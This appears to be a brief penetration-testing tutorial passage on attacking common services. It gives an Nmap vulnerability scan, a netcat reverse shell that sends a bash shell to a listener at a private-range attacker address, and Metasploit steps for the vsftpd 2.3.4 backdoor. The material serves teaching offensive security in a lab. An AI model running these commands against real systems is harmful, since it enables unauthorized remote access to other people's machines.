Common services such as FTP, SMB, SSH, and HTTP are frequent targets because they are widely used and sometimes misconfigured. Attackers often start by scanning the network to identify service versions and check for known vulnerabilities. For instance, outdated FTP servers might allow buffer overflows or backdoor access. Using Nmap and Nessus, attackers can quickly identify weaknesses in these services. Once found, exploits can be launched through frameworks like Metasploit or custom scripts.

**Nmap Vulnerability Scan:**
```bash
nmap -T4 --script=vuln 192.168.150.151
```

**Netcat Reverse Shell Example:**
```bash
# Attacker
nc -lvp 1234

# Victim
nc 192.168.150.123 1234 -e /bin/bash
```

**Exploiting FTP with Metasploit:**
```bash
msfconsole
search vsftpd 2.3.4
use 0
set RHOSTS 192.168.150.151
run
```
